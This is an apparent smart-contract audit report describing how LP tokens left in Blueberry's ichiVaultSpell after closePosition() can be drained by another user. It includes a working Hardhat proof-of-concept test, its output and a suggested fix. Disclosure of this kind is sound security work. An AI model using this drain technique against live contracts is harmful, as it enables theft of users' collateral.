evan

medium

# vault LPTokens can stay in ichiVaultSpell after closePosition() and be drained by another user

## Summary
In closePosition(), the user may specify `amountLpWithdraw`, which is the amount of LPTokens to leave alone (instead of withdrawing liquidity). However, after closePosition(), these LPTokens stay in the ichiVaultSpell contract where they can be withdrawn for free by another user with a specially crafted closePosition() call.

## Vulnerability Detail
https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/IchiVaultSpell.sol#L355
`lpTakeAmt` is the amount of vault LPTokens withdrawn from blueberryBank.

https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/IchiVaultSpell.sol#L294
All but `amountLpWithdraw` of these vault LPTokens get sent to the vault to withdraw the assets. The `amountLpWithdraw` vault LPTokens stay in the ichiVaultSpell contract. 

https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/IchiVaultSpell.sol#L328
https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/BasicSpell.sol#L56-L61
By taking advantage of the closePosition function refunding borrowTokens ^^, these remaining vault LPTokens can be withdrawn by another user for free by calling closePosition with `borrowToken` = vault LPToken, `lpTakeAmt` = `amountRepay` = `amountShareWithdraw` = 0. See proof of concept for more detail.

## Impact
When a user calls closePosition with a nonzero  `amountLpWithdraw`, these vault LPTokens, which are supposed to be the collateral of their position, get stuck in the ichiVaultSpell contract. An attacker can drain these token from the contract, meaning that there will not enough vault LPTokens to pay back the debt when the user decide to fully close their position in the future. Furthermore, this puts the user at a higher risk of liquidation.

## Code Snippet
Please put this test in bank.test.ts, and run `yarn hardhat test --grep Vuln3`
Note that the line `await usdc.transfer(spell.address, utils.parseUnits('10', 6));` is to manually set the vault rewards. It appears in other tests as well.
```javascript
	describe("Vuln3", () => {
		const depositAmount = utils.parseUnits('100', 18);
		const borrowAmount = utils.parseUnits('300', 6);
		
		const iface = new ethers.utils.Interface(SpellABI);

		beforeEach(async () => {
			await usdc.approve(bank.address, ethers.constants.MaxUint256);
			await ichi.approve(bank.address, ethers.constants.MaxUint256);
			await bank.execute(
				0,
				spell.address,
				iface.encodeFunctionData("openPosition", [
					0,
					ICHI,
					USDC,
					depositAmount,
					borrowAmount
				])
			)

			await usdc.connect(alice).approve(bank.address, ethers.constants.MaxUint256);
			await ichi.connect(alice).approve(bank.address, ethers.constants.MaxUint256);
			await bank.connect(alice).execute(
				0,
				spell.address,
				iface.encodeFunctionData("openPosition", [
					0,
					ICHI,
					USDC,
					utils.parseUnits('1', 18),
					utils.parseUnits('1', 6)
				])
			)
		})
		it("remnant LPToken", async () => {
			await ichiVault.rebalance(-260400, -260200, -260800, -260600, 0);
			await usdc.transfer(spell.address, utils.parseUnits('10', 6));

			const ivToken = await ethers.getContractAt("MockIchiVault", ichiVault.address);

			let posInfo = await bank.getPositionInfo(1);

			
			await bank.execute(
				1,
				spell.address,
				iface.encodeFunctionData("closePosition", [
					0,
					ICHI,
					USDC, // ICHI vault lp token is collateral
					ethers.constants.MaxUint256,	// Amount of werc20
					borrowAmount.div(2),  // Amount of repay
					await posInfo.collateralSize.div(2),
					depositAmount.div(2),
				])
			)

			await ichiVault.rebalance(-260400, -260200, -260800, -260600, 0);
			await usdc.transfer(spell.address, utils.parseUnits('0.1', 6));

			console.log("ichivault lpToken balance before");
			console.log("alice: " + await ivToken.balanceOf(alice.address));
			console.log("spell: " + await ivToken.balanceOf(spell.address));

			bank.connect(alice).execute(
				2,
				spell.address,
				iface.encodeFunctionData("closePosition", [
					0,
					ICHI,
					ichiVault.address, // ICHI vault lp token is collateral
					0,	// Amount of werc20
					0,  // Amount of repay
					(await ivToken.balanceOf(spell.address)).mul(9).div(10),
					0,
				])
			)

			await ichiVault.rebalance(-260400, -260200, -260800, -260600, 0);
			console.log("ichivault lpToken balance after");
			console.log("alice: " + await ivToken.balanceOf(alice.address));
			console.log("spell: " + await ivToken.balanceOf(spell.address));
		})
	})
```
Relevant output of the test:
```plaintext
ichivault lpToken balance before
alice: 0
spell: 150000000
ichivault lpToken balance after
alice: 135000000
spell: 0
```
Observe that alice opened a very small position with very little collateral. The victim called closePosition with a nonzero `amountLpWithdraw`, and alice is able to to drain the vault LPTokens that stayed in ichiVaultSpell.
Note that `(await ivToken.balanceOf(spell.address)).mul(9).div(10)`  is to ensure that there is a nonzero amount of vault LP tokens that get sent to the vault to withdraw liquidity (otherwise it won't work). The fraction doesn't necessarily have to be 9/10 - it just has to be less than 1.

## Tool used
Manual Review
Hardhat

## Recommendation
The fix would depend on the intended functionality. The remaining vaultLpTokens should either be sent back to the user with `doRefund`, or it should be returned to the blueberryBank as the collateral of the position with `doPutCollateral`. 
